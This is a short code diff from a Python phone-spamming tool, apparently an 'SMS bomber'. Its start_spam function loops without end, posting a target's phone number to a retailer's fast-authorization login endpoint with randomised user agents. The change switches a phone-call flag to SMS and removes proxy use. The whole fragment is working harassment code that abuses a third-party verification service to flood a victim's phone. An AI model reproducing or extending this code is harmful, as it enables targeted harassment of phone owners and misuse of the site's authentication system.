@@ -89,7 +89,7 @@ def start_spam(phone, proxies):
     headers = {"User-Agent": generate_user_agent()}
     while True:
         try:
-            post("https://www.dns-shop.ru/auth/auth/fast-authorization/", json={"FastAuthorizationLoginLoadForm[login]": phone,"FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]:": "1"}, headers=headers, proxies=proxies)
+            post("https://www.dns-shop.ru/auth/auth/fast-authorization/", json={"FastAuthorizationLoginLoadForm[login]": phone,"FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]:": "0"})
             print(f"{BRIGHT}{GREEN} success dns 2")
         except:
             pass
